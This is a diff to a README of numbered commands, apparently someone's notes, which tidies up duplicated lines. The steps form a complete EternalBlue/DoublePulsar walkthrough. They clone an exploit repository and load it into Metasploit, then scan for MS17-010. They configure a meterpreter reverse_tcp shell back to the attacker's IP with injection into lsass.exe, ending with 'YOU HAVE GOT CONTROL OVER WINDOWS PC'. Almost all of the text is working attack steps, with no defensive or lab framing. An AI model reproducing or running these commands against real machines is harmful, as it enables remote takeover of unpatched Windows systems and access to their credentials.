@@ -21,56 +21,52 @@
 
 2: ```git clone https://github.com/w0rtw0rt/EternalBlue```
 
-3: ```sudo apt-get update```
+3: ```msfconsole```
 
-4: ```git clone https://github.com/w0rtw0rt/EternalBlue```
+4: ```exit```
 
-5: ```msfconsole```
+5: ```sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb```
 
-6: ```exit```
+6: ```sudo dpkg --add-architecture i386```
 
-7: ```sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb```
+7: ```sudo apt-get install libwine (of gewoon wine?)```
 
-8: ```sudo dpkg --add-architecture i386```
+8: ```sudo mkdir /root/.wine```
 
-9: ```sudo apt-get install libwine (of gewoon wine?)```
+9: ```sudo mkdir /root/.wine/c_drive```
 
-10: ```sudo mkdir /root/.wine```
+10: ```sudo metasploit```
 
-11: ```sudo mkdir /root/.wine/c_drive```
+11: ```use auxiliary/scanner/smb/smb_ms17_010```
 
-12: ```sudo metasploit```
+12: ```set RHOSTS <Windows IP>```
 
-13: ```use auxiliary/scanner/smb/smb_ms17_010```
+13: ```run```
 
-14: ```set RHOSTS <Windows IP>```
+14: ```use payload/windows/x64/meterpreter/reverse_tcp```
 
-15: ```run```
+15: ```set LHOST <Kali IP>```
 
-16: ```use payload/windows/x64/meterpreter/reverse_tcp```
+16: ```use exploit/windows/smb/eternalblue_doublepulsar```
 
-17: ```set LHOST <Kali IP>```
+17: ```set payload payload/windows/x64/meterpreter/reverse_tcp```
 
-18: ```use exploit/windows/smb/eternalblue_doublepulsar```
+18: ```set TARGET 8```
 
-19: ```set payload payload/windows/x64/meterpreter/reverse_tcp```
+19: ```set RHOSTS <windows ip>```
 
-20: ```set TARGET 8```
+20: ```set LHOST <kali ip>```
 
-21: ```set RHOSTS <windows ip>```
+21: ```set TARGETARCHITECTURE x64```
 
-22: ```set LHOST <kali ip>```
+22: ```set PROCESSINJECT lsass.exe```
 
-23: ```set TARGETARCHITECTURE x64```
+23: ```set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
 
-24: ```set PROCESSINJECT lsass.exe```
+24: ```set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
 
-25: ```set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
+25: ```set WINEPATH /home/osboxes/.wine/drive_c/```
 
-26: ```set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
-
-27: ```set WINEPATH /home/osboxes/.wine/drive_c/```
-
-28: ```run```
+26: ```run```
 
 YOU HAVE GOT CONTROL OVER WINDOWS PC
